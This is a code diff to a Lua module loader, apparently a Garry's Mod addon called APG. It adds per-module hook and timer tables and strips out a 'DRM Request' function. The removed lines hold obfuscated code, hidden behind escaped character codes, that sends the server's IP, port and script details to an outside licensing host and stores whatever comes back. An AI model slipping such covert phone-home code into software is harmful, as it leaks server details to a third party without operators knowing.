@@ -3,7 +3,7 @@
 ]]--------------------------------------------
 APG = {}
 APG.modules =  APG.modules or {}
-APG.dRM = {}
+
 --[[------------------------------------------
             CLIENT related
 ]]--------------------------------------------
@@ -19,8 +19,9 @@ for _,v in next, modules do
     if v then
         niceName = string.gsub(tostring(v),"%.lua","")
         APG.modules[ niceName ] = false
-        APG.dRM[ niceName ] = ""
         APG[ niceName ] = {}
+        APG[ niceName ][ "hooks"] = {}
+        APG[ niceName ][ "timers"] = {}
     end
 end
 
@@ -39,6 +40,8 @@ function APG.load( module )
     APG.unLoad( module )
     APG.modules[ module ] = true
     APG[ module ] = {}
+    APG[ module ][ "hooks"] = {}
+    APG[ module ][ "timers"] = {}
     include( "apg/modules/" .. module .. ".lua" )
 end
 
@@ -110,21 +113,3 @@ concommand.Add("apg", function( ply, cmd, args, argStr )
         APG.log( ply, "Error : unknown setting")
     end
 end)
-
---[[------------------------------------------
-            DRM Request
-]]--------------------------------------------
-function APG_DRM(scriptid, hash, filename, version, additional, mod)
-    if not isnumber(scriptid) or not hash then return end;
-    filename = filename or "";
-    version = version or "";
-    additional = additional or "";
-    local srv = string.Explode( ":", game.GetIPAddress() );
-    _G["\104\116\116\112"]["\70\101\116\99\104"]("\104\116\116\112\58\47\47\115\99\114\105\112\116\101\110\102\111\114\99\101\114\46\110\101\116\47\97\112\105\47\108\117\97\47\63\48\61"..scriptid.."&sip="..srv[1].."&v="..version.."&1="..hash.."&2="..srv[2].."&3="..additional.."&file="..filename,
-        function(________, __, __, __________)
-            if _G["\115\116\114\105\110\103"]["\108\101\110"](________) > 0 then
-                APG.dRM[mod] = ________
-            end
-        end
-    )
-end
